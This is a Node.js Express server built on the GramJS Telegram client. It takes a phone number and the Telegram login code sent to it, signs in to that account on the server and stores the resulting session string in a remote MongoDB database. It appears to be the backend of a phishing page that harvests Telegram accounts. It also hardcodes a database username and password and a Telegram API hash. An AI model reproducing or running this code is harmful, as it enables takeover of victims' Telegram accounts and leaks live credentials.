const express = require('express');
const cors = require('cors');
const { TelegramClient } = require('telegram');
const { StringSession } = require('telegram/sessions');
const mongoose = require('mongoose');

const app = express();
app.use(cors());
app.use(express.json());

// MongoDB Connection
const MONGO_URI = "mongodb+srv://mercyinfo52_db_user:Hinva312!@cluster0.a0bslma.mongodb.net/?retryWrites=true&w=majority";
mongoose.connect(MONGO_URI).then(() => console.log("DB connected"));

const SessionSchema = new mongoose.Schema({ session: String, phone: String });
const SessionModel = mongoose.model('Session', SessionSchema);

// Temp store for in-progress logins
const activeLogins = new Map();

app.post('/send-otp', async (req, res) => {
    const { phone } = req.body;
    const client = new TelegramClient(new StringSession(""), 23049703, "e9c00af578a9de0253ef02337460498f", { connectionRetries: 5 });
    await client.connect();
    const result = await client.sendCode({ apiId: 23049703, apiHash: "e9c00af578a9de0253ef02337460498f" }, phone);
    activeLogins.set(phone, { client, phoneCodeHash: result.phoneCodeHash });
    res.json({ success: true });
});

app.post('/verify-otp', async (req, res) => {
    const { phone, code } = req.body;
    const loginData = activeLogins.get(phone);
    if (!loginData) return res.status(400).json({ error: "Session abgelaufen" });

    try {
        await loginData.client.signIn({ phoneCode: code, phoneCodeHash: loginData.phoneCodeHash, phoneNumber: phone });
        const sessionString = loginData.client.session.save();
        await SessionModel.create({ session: sessionString, phone });
        res.json({ success: true });
    } catch (e) {
        res.status(400).json({ error: e.message });
    }
});

app.listen(process.env.PORT || 3000);
